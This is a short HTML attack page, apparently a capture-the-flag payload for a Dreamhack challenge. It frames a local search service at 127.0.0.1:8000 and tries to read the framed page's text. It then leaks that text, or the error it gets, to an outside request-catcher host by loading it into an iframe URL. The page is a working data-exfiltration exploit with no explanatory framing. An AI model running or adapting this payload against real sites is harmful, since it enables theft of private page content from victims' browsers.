
<html>
    <head>
        <script>
            const afterLoad = function() {
                  const iframe = document.createElement("iframe")
                  let text = "";
                try {
                    if (document.getElementsByTagName("iframe")[0]) {
                        text = "iframe"
                    }
                    if (document.getElementsByTagName("iframe")[0].contentWindow) {
                        text = "contentWindow"
                    }
                    if (document.getElementsByTagName("iframe")[0].contentDocument.getElementsByTagName("pre")[0].textContent) {
                        text = document.getElementsByTagName("iframe")[0].contentDocument.getElementsByTagName("pre")[0].textContent
                    }
                    }
                    catch (error) {
                        text = error
                    }
                
                  iframe.src = "https://gjiuwez.request.dreamhack.games/" + text
                  document.body.append(iframe)
              }
          </script>
    </head> 
      <body>
    
          <iframe src="http://127.0.0.1:8000/search?query=D" id="query" onerror="afterLoad()" onload="afterLoad()"></iframe>
      </body>
</html>
